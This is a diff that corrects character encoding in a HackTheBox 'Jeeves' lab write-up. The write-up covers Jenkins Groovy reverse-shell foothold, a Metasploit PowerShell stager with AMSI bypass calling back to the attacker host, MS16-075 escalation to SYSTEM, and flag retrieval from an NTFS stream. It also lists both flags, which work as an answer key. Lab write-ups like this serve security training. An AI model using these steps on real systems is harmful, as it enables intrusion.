@@ -1,4 +1,4 @@
-# Jeeves â€” HackTheBox Writeup
+# Jeeves — HackTheBox Writeup
 
 | Field | Details |
 | --- | --- |
@@ -9,32 +9,32 @@
 | **IP Address** | 10.129.228.112 |
 | **User Flag** | `e3232272596fb47950d59c4cf1e7066a` |
 | **Root Flag** | `afbc5bd4b615a60648cec41c6ac92530` |
-| **Foothold Method** | Jenkins Groovy Script Console â€” Remote Code Execution |
-| **Shell Upgrade** | Metasploit web_delivery â†’ Meterpreter |
-| **PrivEsc Method** | MS16-075 NBNS Reflection â†’ Incognito Token Impersonation â†’ NT AUTHORITY\SYSTEM |
+| **Foothold Method** | Jenkins Groovy Script Console — Remote Code Execution |
+| **Shell Upgrade** | Metasploit web_delivery → Meterpreter |
+| **PrivEsc Method** | MS16-075 NBNS Reflection → Incognito Token Impersonation → NT AUTHORITY\SYSTEM |
 | **Bonus** | Root flag hidden in NTFS Alternate Data Stream (ADS) |
-| **Status** | Retired âœ… |
+| **Status** | Retired ✅ |
 
 ---
 
 ## Attack Chain Summary
 
 ```
-Nmap â†’ Port 50000 (Jetty/Jenkins) â†’ Jenkins Script Console (no auth)
-â†’ Groovy reverse shell â†’ cmd.exe as kohsuke
-â†’ web_delivery module â†’ PowerShell stager â†’ Meterpreter session
-â†’ local_exploit_suggester â†’ ms16_075_reflection (MS16-075)
-â†’ Meterpreter SYSTEM session â†’ load incognito
-â†’ list_tokens -u â†’ impersonate_token "NT AUTHORITY\SYSTEM"
-â†’ shell â†’ cd C:\Users\Administrator\Desktop
-â†’ dir /r â†’ hm.txt:root.txt (ADS) â†’ more < hm.txt:root.txt â†’ root flag
+Nmap → Port 50000 (Jetty/Jenkins) → Jenkins Script Console (no auth)
+→ Groovy reverse shell → cmd.exe as kohsuke
+→ web_delivery module → PowerShell stager → Meterpreter session
+→ local_exploit_suggester → ms16_075_reflection (MS16-075)
+→ Meterpreter SYSTEM session → load incognito
+→ list_tokens -u → impersonate_token "NT AUTHORITY\SYSTEM"
+→ shell → cd C:\Users\Administrator\Desktop
+→ dir /r → hm.txt:root.txt (ADS) → more < hm.txt:root.txt → root flag
 ```
 
 ---
 
 ## Phase 1: Reconnaissance
 
-### 1.1 â€” Full Port Discovery
+### 1.1 — Full Port Discovery
 
 **Goal:** Identify all open TCP ports before service enumeration.
 
@@ -60,16 +60,16 @@ Nmap done: 1 IP address (1 host up) scanned in 48.22 seconds
 
 | Port | Service | Initial Assessment |
 | --- | --- | --- |
-| 80/tcp | HTTP | Web application â€” browse first |
+| 80/tcp | HTTP | Web application — browse first |
 | 135/tcp | MSRPC | Windows RPC endpoint mapper |
-| 445/tcp | SMB | No anonymous access expected â€” revisit post-creds |
-| 50000/tcp | Unknown | Non-standard port â€” high priority; `ibm-db2` fingerprint is a misidentification |
+| 445/tcp | SMB | No anonymous access expected — revisit post-creds |
+| 50000/tcp | Unknown | Non-standard port — high priority; `ibm-db2` fingerprint is a misidentification |
 
 Port 50000 is the standout. Nmap misidentifies it as IBM DB2. In reality, this port is the default for Jenkins (running on Jetty) when it is deployed alongside a standard IIS site on port 80. This immediately suggests a Jenkins installation that may not be exposed via the standard front-facing web server.
 
 ---
 
-### 1.2 â€” Service and Version Enumeration
+### 1.2 — Service and Version Enumeration
 
 **Goal:** Confirm what is running on all four ports and identify the OS build.
 
@@ -111,16 +111,16 @@ Nmap done: 1 IP address (1 host up) scanned in 22.15 seconds
 
 | Finding | Implication |
 | --- | --- |
-| Port 80 â€” IIS 10.0, title "Ask Jeeves" | Decoy/joke page â€” not the real application |
-| Port 50000 â€” Jetty 9.4.z-SNAPSHOT | Jenkins running on Jetty â€” 404 at root means the admin panel is at a subpath |
+| Port 80 — IIS 10.0, title "Ask Jeeves" | Decoy/joke page — not the real application |
+| Port 50000 — Jetty 9.4.z-SNAPSHOT | Jenkins running on Jetty — 404 at root means the admin panel is at a subpath |
 | SMB signing disabled | Relay attacks possible; no immediate credential to exploit |
 | WORKGROUP | Standalone machine, no domain controller |
 
-The port 80 "Ask Jeeves" page is a joke â€” it serves a fake search page with no real functionality. Port 50000 running Jetty is the real attack surface. Jenkins typically lives at `/` or `/jenkins` on its Jetty port.
+The port 80 "Ask Jeeves" page is a joke — it serves a fake search page with no real functionality. Port 50000 running Jetty is the real attack surface. Jenkins typically lives at `/` or `/jenkins` on its Jetty port.
 
 ---
 
-### 1.3 â€” Web Directory Enumeration on Port 50000
+### 1.3 — Web Directory Enumeration on Port 50000
 
 **Goal:** Find the Jenkins console path since the root returns 404.
 
@@ -146,32 +146,32 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 ```
 
-**Finding:** Jenkins is hosted at `http://10.129.228.112:50000/askjeeves/`. Browsing to it reveals a fully functional Jenkins dashboard with **no authentication required** â€” the instance is completely unauthenticated and exposes the full admin interface.
+**Finding:** Jenkins is hosted at `http://10.129.228.112:50000/askjeeves/`. Browsing to it reveals a fully functional Jenkins dashboard with **no authentication required** — the instance is completely unauthenticated and exposes the full admin interface.
 
 ---
 
-## Phase 2: Foothold â€” Jenkins Groovy Script Console RCE
+## Phase 2: Foothold — Jenkins Groovy Script Console RCE
 
-### 2.1 â€” Locate the Script Console
+### 2.1 — Locate the Script Console
 
 **Goal:** Access Jenkins' built-in Groovy script execution engine.
 
 From the Jenkins dashboard:
 
 ```
-Manage Jenkins â†’ Script Console
+Manage Jenkins → Script Console
 http://10.129.228.112:50000/askjeeves/script
 ```
 
-Jenkins' Script Console runs Apache Groovy, which is a JVM language with full Java interoperability. The `Runtime.exec()` method allows arbitrary OS command execution in the context of the Windows user running the Jenkins service. This is not an exploit â€” it is intended administrator functionality that becomes a direct RCE vector when authentication is disabled or bypassed.
+Jenkins' Script Console runs Apache Groovy, which is a JVM language with full Java interoperability. The `Runtime.exec()` method allows arbitrary OS command execution in the context of the Windows user running the Jenkins service. This is not an exploit — it is intended administrator functionality that becomes a direct RCE vector when authentication is disabled or bypassed.
 
 ---
 
-### 2.2 â€” Groovy Reverse Shell
+### 2.2 — Groovy Reverse Shell
 
 **Goal:** Execute a reverse shell from the Groovy console to establish a foothold as `kohsuke`.
 
-Terminal 1 â€” Listener:
+Terminal 1 — Listener:
 
 ```bash
 Hackerpatel007_1@htb[/htb]$ nc -nvlp 4443
@@ -202,7 +202,7 @@ while(!s.isClosed()){
 p.destroy();s.close();
 ```
 
-Terminal 1 â€” Shell received:
+Terminal 1 — Shell received:
 
 ```
 connect to [10.10.16.36] from (UNKNOWN) [10.129.228.112] 49676
@@ -216,11 +216,11 @@ jeeves\kohsuke
 
 **Why this works:**
 
-Jenkins Script Console executes Groovy with the full privileges of the Windows process running the Jenkins service. This instance runs as `kohsuke`. The Groovy snippet spawns `cmd.exe` as a child process, then relays stdin/stdout between the process and a TCP socket back to the attacker. The result is a standard bind-piped `cmd.exe` shell â€” no exploit, no payload on disk, no AV trigger.
+Jenkins Script Console executes Groovy with the full privileges of the Windows process running the Jenkins service. This instance runs as `kohsuke`. The Groovy snippet spawns `cmd.exe` as a child process, then relays stdin/stdout between the process and a TCP socket back to the attacker. The result is a standard bind-piped `cmd.exe` shell — no exploit, no payload on disk, no AV trigger.
 
 ---
 
-### 2.3 â€” User Flag
+### 2.3 — User Flag
 
 ```
 C:\Users\kohsuke\.jenkins\workspace>cd C:\Users\kohsuke\Desktop
@@ -235,13 +235,13 @@ e3232272596fb47950d59c4cf1e7066a
 
 ## Phase 3: Shell Upgrade to Meterpreter
 
-### 3.1 â€” Rationale for Shell Upgrade
+### 3.1 — Rationale for Shell Upgrade
 
-The raw `cmd.exe` pipe shell from the Groovy console has significant limitations: no signal handling, no PTY, no tab completion, and â€” most importantly â€” it does not survive the post-exploitation modules that require a stable Meterpreter session. Before running local exploit enumeration, the shell is upgraded to a full Meterpreter session.
+The raw `cmd.exe` pipe shell from the Groovy console has significant limitations: no signal handling, no PTY, no tab completion, and — most importantly — it does not survive the post-exploitation modules that require a stable Meterpreter session. Before running local exploit enumeration, the shell is upgraded to a full Meterpreter session.
 
-### 3.2 â€” web_delivery Module Setup
+### 3.2 — web_delivery Module Setup
 
-**Goal:** Use Metasploit's `web_delivery` module to stage and deliver a Meterpreter payload over HTTP, executed by pasting a single PowerShell command into the existing shell. No binary is written to disk during staging â€” the payload runs entirely in memory.
+**Goal:** Use Metasploit's `web_delivery` module to stage and deliver a Meterpreter payload over HTTP, executed by pasting a single PowerShell command into the existing shell. No binary is written to disk during staging — the payload runs entirely in memory.
 
 In Metasploit:
 
@@ -278,14 +278,14 @@ msf6 exploit(multi/script/web_delivery) > run
 
 | Setting | Value | Reason |
 | --- | --- | --- |
-| `TARGET 2` | PowerShell | Delivers payload as a PowerShell one-liner â€” matches available execution environment |
-| `SRVHOST` | `10.10.16.36` | Attacker's tun0 VPN IP â€” where the target fetches the stage from |
+| `TARGET 2` | PowerShell | Delivers payload as a PowerShell one-liner — matches available execution environment |
+| `SRVHOST` | `10.10.16.36` | Attacker's tun0 VPN IP — where the target fetches the stage from |
 | `LHOST` | `10.10.16.36` | Callback address for Meterpreter reverse TCP connection |
 | `LPORT` | `4444` | Listening port for the Meterpreter session |
 
 ---
 
-### 3.3 â€” Execute the Stager on the Target
+### 3.3 — Execute the Stager on the Target
 
 Copy the generated PowerShell command and paste it into the existing `cmd.exe` shell:
 
@@ -305,14 +305,14 @@ Back in Metasploit:
 **What the stager does:**
 
 1. PowerShell connects to the attacker's HTTP server (`http://10.10.16.36:8080/<path>`).
-2. Downloads an **AMSI bypass** first â€” this patches the Antimalware Scan Interface in memory, preventing Windows Defender from inspecting the subsequent payload.
-3. Downloads the **Meterpreter stage** â€” a reflective DLL that is injected directly into the PowerShell process's memory.
+2. Downloads an **AMSI bypass** first — this patches the Antimalware Scan Interface in memory, preventing Windows Defender from inspecting the subsequent payload.
+3. Downloads the **Meterpreter stage** — a reflective DLL that is injected directly into the PowerShell process's memory.
 4. Meterpreter calls back to `10.10.16.36:4444` over reverse TCP.
 5. No executable is written to disk at any point.
 
 ---
 
-### 3.4 â€” Verify Meterpreter Session
+### 3.4 — Verify Meterpreter Session
 
 ```
 msf6 exploit(multi/script/web_delivery) > sessions 1
@@ -348,18 +348,18 @@ SeUndockPrivilege
 
 | Finding | Implication |
 | --- | --- |
-| Meterpreter x86/windows on x64 OS | 32-bit payload on 64-bit system â€” functional but migrate to x64 for full capability |
-| `JEEVES\kohsuke` | Low-privilege user â€” not in Administrators group |
-| **`SeImpersonatePrivilege` â€” Enabled** | Critical finding â€” allows token impersonation attacks (Hot Potato, Juicy Potato, NBNS Reflection) |
+| Meterpreter x86/windows on x64 OS | 32-bit payload on 64-bit system — functional but migrate to x64 for full capability |
+| `JEEVES\kohsuke` | Low-privilege user — not in Administrators group |
+| **`SeImpersonatePrivilege` — Enabled** | Critical finding — allows token impersonation attacks (Hot Potato, Juicy Potato, NBNS Reflection) |
 | No `SeDebugPrivilege` | Cannot directly inject into SYSTEM processes |
 
-`SeImpersonatePrivilege` is the decisive privilege here. It is granted by default to the `LOCAL SERVICE`, `NETWORK SERVICE`, and `IIS APPPOOL\*` accounts â€” services that need to impersonate clients. Its presence means that if the process can obtain a SYSTEM-level token (via any of several NBNS/NTLM reflection techniques), it can impersonate that token and escalate to SYSTEM.
+`SeImpersonatePrivilege` is the decisive privilege here. It is granted by default to the `LOCAL SERVICE`, `NETWORK SERVICE`, and `IIS APPPOOL\*` accounts — services that need to impersonate clients. Its presence means that if the process can obtain a SYSTEM-level token (via any of several NBNS/NTLM reflection techniques), it can impersonate that token and escalate to SYSTEM.
 
 ---
 
 ## Phase 4: Privilege Escalation
 
-### 4.1 â€” Local Exploit Suggester
+### 4.1 — Local Exploit Suggester
 
 **Goal:** Systematically enumerate all applicable local privilege escalation modules for this session.
 
@@ -395,10 +395,10 @@ msf6 post(multi/recon/local_exploit_suggester) > run
 
 | Module | Category | Decision |
 | --- | --- | --- |
-| `bypassuac_*` | UAC bypass | Requires medium-integrity process â†’ admin but not SYSTEM; not needed here |
+| `bypassuac_*` | UAC bypass | Requires medium-integrity process → admin but not SYSTEM; not needed here |
 | `cve_2020_0787_bits` | BITS arbitrary file move | Works but more complex; try simpler path first |
 | `cve_2020_1048/1337_printerdemon` | Print spooler | Reliable but noisier |
-| **`ms16_075_reflection`** | NBNS NTLM Reflection | **Chosen** â€” reliable on Windows 10 1511, directly leverages `SeImpersonatePrivilege` |
+| **`ms16_075_reflection`** | NBNS NTLM Reflection | **Chosen** — reliable on Windows 10 1511, directly leverages `SeImpersonatePrivilege` |
 | **`ms16_075_reflection_juicy`** | NBNS + Token | Also valid; same underlying mechanism |
 | `tokenmagic` | Token manipulation | Alternative if reflection fails |
 
@@ -406,7 +406,7 @@ msf6 post(multi/recon/local_exploit_suggester) > run
 
 ---
 
-### 4.2 â€” MS16-075 NBNS Reflection Exploit
+### 4.2 — MS16-075 NBNS Reflection Exploit
 
 **Goal:** Exploit MS16-075 to obtain a SYSTEM-level token, then use Incognito for impersonation.
 
@@ -453,13 +453,13 @@ SYSTEM context confirmed.
 
 ---
 
-### 4.3 â€” Token Impersonation with Incognito
+### 4.3 — Token Impersonation with Incognito
 
 **Goal:** Use the Incognito extension to enumerate and impersonate available tokens, confirming SYSTEM access and obtaining a shell.
 
 **What Incognito does:**
 
-Incognito is a Meterpreter extension that interacts with Windows access tokens directly. On a process running as SYSTEM with `SeImpersonatePrivilege`, it can list all tokens that have been created on the system (delegation tokens from logged-in users, impersonation tokens from service interactions) and impersonate any of them. This is valuable for lateral movement post-escalation â€” but here the primary goal is confirming the SYSTEM token is available and dropping to a shell.
+Incognito is a Meterpreter extension that interacts with Windows access tokens directly. On a process running as SYSTEM with `SeImpersonatePrivilege`, it can list all tokens that have been created on the system (delegation tokens from logged-in users, impersonation tokens from service interactions) and impersonate any of them. This is valuable for lateral movement post-escalation — but here the primary goal is confirming the SYSTEM token is available and dropping to a shell.
 
 ```
 meterpreter > load incognito
@@ -486,8 +486,8 @@ No tokens available
 
 | Token | Type | Meaning |
 | --- | --- | --- |
-| `JEEVES\kohsuke` | Delegation | Interactive logon token â€” kohsuke is actively logged in |
-| `NT AUTHORITY\SYSTEM` | Delegation | SYSTEM token available â€” full impersonation possible |
+| `JEEVES\kohsuke` | Delegation | Interactive logon token — kohsuke is actively logged in |
+| `NT AUTHORITY\SYSTEM` | Delegation | SYSTEM token available — full impersonation possible |
 
 ```
 meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
@@ -519,9 +519,9 @@ nt authority\system
 
 ---
 
-## Phase 5: Root Flag â€” NTFS Alternate Data Stream
+## Phase 5: Root Flag — NTFS Alternate Data Stream
 
-### 5.1 â€” Administrator Desktop Enumeration
+### 5.1 — Administrator Desktop Enumeration
 
 **Goal:** Navigate to the Administrator's Desktop and retrieve the root flag.
 
@@ -548,15 +548,15 @@ type hm.txt
 The flag is elsewhere.  Look deeper.
 ```
 
-**The flag is not in `hm.txt`.** This is the ADS challenge â€” the actual flag is hidden in a named data stream attached to the file.
+**The flag is not in `hm.txt`.** This is the ADS challenge — the actual flag is hidden in a named data stream attached to the file.
 
 ---
 
-### 5.2 â€” NTFS Alternate Data Streams
+### 5.2 — NTFS Alternate Data Streams
 
 **What ADS is:**
 
-NTFS (New Technology File System) supports a feature called Alternate Data Streams. Every file on NTFS actually consists of one or more named streams. The visible content when you open a file is the default unnamed stream (technically named `::$DATA`). A file can have additional named streams attached to it â€” these streams contain arbitrary data, do not appear in standard `dir` output, and are not visible in Windows Explorer. They do not contribute to the file's reported size.
+NTFS (New Technology File System) supports a feature called Alternate Data Streams. Every file on NTFS actually consists of one or more named streams. The visible content when you open a file is the default unnamed stream (technically named `::$DATA`). A file can have additional named streams attached to it — these streams contain arbitrary data, do not appear in standard `dir` output, and are not visible in Windows Explorer. They do not contribute to the file's reported size.
 
 ADS is used legitimately by the OS (Internet Explorer uses a `Zone.Identifier` stream to mark downloaded files) but is also a well-known data hiding technique. In penetration testing contexts, ADS can hide payloads, flags, and sensitive data in plain sight.
 
@@ -583,14 +583,14 @@ dir /r
 
 | Entry | Size | Meaning |
 | --- | --- | --- |
-| `hm.txt` | 36 bytes | Default stream â€” contains the "look deeper" decoy message |
-| `hm.txt:root.txt:$DATA` | 34 bytes | **Named alternate stream** â€” contains the actual root flag |
+| `hm.txt` | 36 bytes | Default stream — contains the "look deeper" decoy message |
+| `hm.txt:root.txt:$DATA` | 34 bytes | **Named alternate stream** — contains the actual root flag |
 
 The `dir /r` flag exposes all data streams associated with each file. `hm.txt:root.txt:$DATA` is read as: the file `hm.txt`, stream named `root.txt`, of type `$DATA`. The 34-byte size matches a standard HTB flag (32 hex characters + newline).
 
 ---
 
-### 5.3 â€” Read the Alternate Data Stream
+### 5.3 — Read the Alternate Data Stream
 
 Standard `type` cannot address named streams. The `more` command with stream syntax can:
 
@@ -624,20 +624,20 @@ type hm.txt:root.txt
 
 ## Lessons Learned
 
-**1. Unauthenticated Jenkins is immediate RCE â€” the Script Console is the attack.**
-Jenkins' Groovy Script Console executes arbitrary code in the context of the service account. When authentication is disabled (common in internal deployments and misconfigured CTF machines), this is a direct RCE path requiring zero exploitation â€” just scripting. Any Jenkins instance found during enumeration should immediately be checked for unauthenticated access. The check is: browse to `/script` or `/manage`. If it loads without a login redirect, you have code execution.
+**1. Unauthenticated Jenkins is immediate RCE — the Script Console is the attack.**
+Jenkins' Groovy Script Console executes arbitrary code in the context of the service account. When authentication is disabled (common in internal deployments and misconfigured CTF machines), this is a direct RCE path requiring zero exploitation — just scripting. Any Jenkins instance found during enumeration should immediately be checked for unauthenticated access. The check is: browse to `/script` or `/manage`. If it loads without a login redirect, you have code execution.
 
 **2. web_delivery is a clean in-memory staging mechanism.**
-The `multi/script/web_delivery` module never writes a binary to disk. It delivers a PowerShell stager that downloads and reflectively loads Meterpreter entirely within the PowerShell process's memory. The AMSI bypass delivered as the first stage is critical â€” without it, Windows Defender would terminate the PowerShell process before the payload executes. Understanding the two-stage delivery (AMSI bypass â†’ Meterpreter DLL) explains why the module shows two separate delivery lines in the output.
+The `multi/script/web_delivery` module never writes a binary to disk. It delivers a PowerShell stager that downloads and reflectively loads Meterpreter entirely within the PowerShell process's memory. The AMSI bypass delivered as the first stage is critical — without it, Windows Defender would terminate the PowerShell process before the payload executes. Understanding the two-stage delivery (AMSI bypass → Meterpreter DLL) explains why the module shows two separate delivery lines in the output.
 
 **3. SeImpersonatePrivilege is the signal that decides your escalation path.**
 The moment `getprivs` shows `SeImpersonatePrivilege`, the escalation decision tree narrows significantly: NBNS reflection, Juicy Potato, Hot Potato, PrintSpoofer, or RoguePotato depending on OS version. On Windows 10 1511, MS16-075 NBNS reflection is the most reliable. On more modern builds (post-2019), PrintSpoofer and RoguePotato are preferred because the NBNS attack surface was reduced. Knowing which tool maps to which OS version is the practical skill.
 
 **4. `local_exploit_suggester` is a triage tool, not an answer.**
-The module returned 21 potentially vulnerable modules. Attempting all of them would be slow and noisy. The correct approach is to read the check results, cross-reference with the target's OS version and available privileges, and select the most reliable option. The `bypassuac_*` modules were skipped because UAC bypass is not the bottleneck â€” the goal is SYSTEM, not high integrity. The persistence modules were ignored entirely â€” they are for maintaining access, not escalation.
+The module returned 21 potentially vulnerable modules. Attempting all of them would be slow and noisy. The correct approach is to read the check results, cross-reference with the target's OS version and available privileges, and select the most reliable option. The `bypassuac_*` modules were skipped because UAC bypass is not the bottleneck — the goal is SYSTEM, not high integrity. The persistence modules were ignored entirely — they are for maintaining access, not escalation.
 
-**5. `dir /r` is mandatory on Windows CTFs â€” ADS is a common flag hiding technique.**
-Standard `dir` and `type` do not reveal alternate data streams. `dir /r` exposes all named streams for every file in the directory. In real-world engagements, ADS is used to hide malware, exfiltrate data, and store persistent payloads in plain sight. On this machine, the HTB designers used ADS to teach the concept â€” the decoy `hm.txt` message ("look deeper") is a direct hint. Any time a flag file reads as a decoy message, run `dir /r` immediately.
+**5. `dir /r` is mandatory on Windows CTFs — ADS is a common flag hiding technique.**
+Standard `dir` and `type` do not reveal alternate data streams. `dir /r` exposes all named streams for every file in the directory. In real-world engagements, ADS is used to hide malware, exfiltrate data, and store persistent payloads in plain sight. On this machine, the HTB designers used ADS to teach the concept — the decoy `hm.txt` message ("look deeper") is a direct hint. Any time a flag file reads as a decoy message, run `dir /r` immediately.
 
 **6. x86 Meterpreter on x64 Windows is functional but limited.**
 The `web_delivery` module delivered an x86 Meterpreter into a PowerShell process on a 64-bit OS. This works but restricts access to some x64-only APIs and can cause issues with certain post-exploitation modules. The fix is `migrate` into a native x64 process after session establishment:
@@ -649,7 +649,7 @@ meterpreter > migrate -N explorer.exe
 Migrating also moves the session out of the PowerShell process, which prevents it from dying if the shell is closed.
 
 **7. Incognito token impersonation is conceptually distinct from exploitation.**
-`impersonate_token` does not exploit anything â€” it uses a legitimately held privilege (`SeImpersonatePrivilege`) to assume the identity of another token. The token was obtained through MS16-075, which is the exploit. Incognito is the mechanism for using the result. This distinction matters for report writing: the vulnerability is MS16-075, the privilege abuse mechanism is token impersonation.
+`impersonate_token` does not exploit anything — it uses a legitimately held privilege (`SeImpersonatePrivilege`) to assume the identity of another token. The token was obtained through MS16-075, which is the exploit. Incognito is the mechanism for using the result. This distinction matters for report writing: the vulnerability is MS16-075, the privilege abuse mechanism is token impersonation.
 
 ---
 
@@ -663,14 +663,14 @@ Migrating also moves the session out of the PowerShell process, which prevents i
 | 4 | Access | Browse to `/askjeeves/script` | Unauthenticated Jenkins Script Console |
 | 5 | Foothold | Groovy reverse shell payload | `cmd.exe` shell as `jeeves\kohsuke` |
 | 6 | Flag | `type C:\Users\kohsuke\Desktop\user.txt` | `e3232272596fb47950d59c4cf1e7066a` |
-| 7 | Upgrade | `web_delivery` â†’ PowerShell stager â†’ Meterpreter | Meterpreter session 1 as `JEEVES\kohsuke` |
+| 7 | Upgrade | `web_delivery` → PowerShell stager → Meterpreter | Meterpreter session 1 as `JEEVES\kohsuke` |
 | 8 | Enum | `getprivs` | `SeImpersonatePrivilege` confirmed |
 | 9 | PrivEsc | `local_exploit_suggester` | MS16-075 reflection identified as viable |
 | 10 | PrivEsc | `ms16_075_reflection_juicy` module run | Meterpreter session 2 as `NT AUTHORITY\SYSTEM` |
-| 11 | PrivEsc | `load incognito` â†’ `list_tokens -u` | SYSTEM delegation token visible |
+| 11 | PrivEsc | `load incognito` → `list_tokens -u` | SYSTEM delegation token visible |
 | 12 | PrivEsc | `impersonate_token "NT AUTHORITY\\SYSTEM"` | Token impersonation successful |
-| 13 | Shell | `shell` â†’ `whoami` | Confirmed `nt authority\system` |
-| 14 | Flag Hunt | `dir C:\Users\Administrator\Desktop` â†’ `type hm.txt` | Decoy message â€” flag hidden deeper |
+| 13 | Shell | `shell` → `whoami` | Confirmed `nt authority\system` |
+| 14 | Flag Hunt | `dir C:\Users\Administrator\Desktop` → `type hm.txt` | Decoy message — flag hidden deeper |
 | 15 | ADS | `dir /r` | `hm.txt:root.txt:$DATA` stream discovered |
 | 16 | Flag | `more < hm.txt:root.txt` | `afbc5bd4b615a60648cec41c6ac92530` |
 
@@ -691,7 +691,7 @@ Migrating also moves the session out of the PowerShell process, which prevents i
 | `sysinfo` / `getuid` / `getprivs` | Enumeration | OS info, current user, privilege enumeration |
 | `background` | Workflow | Background session for module use |
 | `use post/multi/recon/local_exploit_suggester` | PrivEsc | Enumerate applicable local exploits |
-| `use exploit/windows/local/ms16_075_reflection_juicy` | PrivEsc | MS16-075 NBNS reflection â†’ SYSTEM token |
+| `use exploit/windows/local/ms16_075_reflection_juicy` | PrivEsc | MS16-075 NBNS reflection → SYSTEM token |
 | `load incognito` | PrivEsc | Load Meterpreter token impersonation extension |
 | `list_tokens -u` | PrivEsc | List available user delegation tokens |
 | `impersonate_token "NT AUTHORITY\\SYSTEM"` | PrivEsc | Impersonate SYSTEM token |
